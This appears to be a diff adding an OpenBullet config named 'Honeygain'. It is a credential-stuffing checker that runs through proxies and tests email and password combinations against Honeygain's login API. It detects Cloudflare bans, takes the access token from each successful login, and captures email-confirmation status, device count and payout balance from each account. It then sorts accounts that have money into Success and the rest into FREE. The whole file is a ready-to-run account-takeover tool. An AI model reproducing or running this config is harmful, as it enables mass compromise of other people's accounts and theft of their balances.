@@ -1,0 +1,89 @@
+[SETTINGS]
+{
+  "Name": "Honeygain",
+  "SuggestedBots": 200,
+  "MaxCPM": 0,
+  "LastModified": "2021-08-14T16:07:26.7146524+01:00",
+  "AdditionalInfo": "",
+  "Author": "",
+  "Version": "1.3.1 [Anomaly]",
+  "LoliSave": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://dashboard.honeygain.com/api/v1/users/tokens" 
+  CONTENT "{\"email\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "content-type: application/json;charset=UTF-8" 
+  HEADER "cookie: __zlcmid=15CkCOZCqWZBiJW; G_ENABLED_IDPS=google" 
+  HEADER "origin: https://dashboard.honeygain.com" 
+  HEADER "referer: https://dashboard.honeygain.com/login" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "details\":\"Bad credentials" 
+    KEY "title\":\"not_valid_login_credentials" 
+  KEYCHAIN Success OR 
+    KEY "access_token" 
+  KEYCHAIN Ban OR 
+    KEY "Error 1015 " 
+    KEY "Cloudflare to restrict access" 
+
+PARSE "<SOURCE>" LR "access_token\":\"" "\"}}" -> VAR "token" 
+
+REQUEST GET "https://dashboard.honeygain.com/api/v1/users/me" 
+  
+  HEADER "authorization: Bearer <token>" 
+  HEADER "cookie: __zlcmid=15CkCOZCqWZBiJW; G_ENABLED_IDPS=google" 
+  HEADER "referer: https://dashboard.honeygain.com/login" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" LR "email_confirmed\":" ",\"referral" CreateEmpty=FALSE -> CAP "Email Confirmed" 
+
+PARSE "<SOURCE>" LR "\",\"total_devices\":" ",\"email" CreateEmpty=FALSE -> CAP "Devices" 
+
+REQUEST GET "https://dashboard.honeygain.com/api/v1/users/balances" 
+  
+  HEADER "authorization: Bearer <token>" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" LR "},\"payout\":{\"credits\":" "},\"min_payout" CreateEmpty=FALSE -> VAR "cap" 
+
+PARSE "<cap>" LR "" ",\"usd_cents\":" UseRegexLR=TRUE -> CAP "Balance" 
+
+PARSE "<cap>" LR ",\"usd_cents\":" "" -> VAR "payout" 
+
+KEYCHECK 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "<payout>" LessThan "2000" 
+  KEYCHAIN Success OR 
+    KEY "<payout>" GreaterThan "1999" 
+  KEYCHAIN Custom "2FACTOR" OR 
+    KEY "<payout>" GreaterThan "1999" 
+    KEY "<Email Confirmed>" Contains "true" 
+
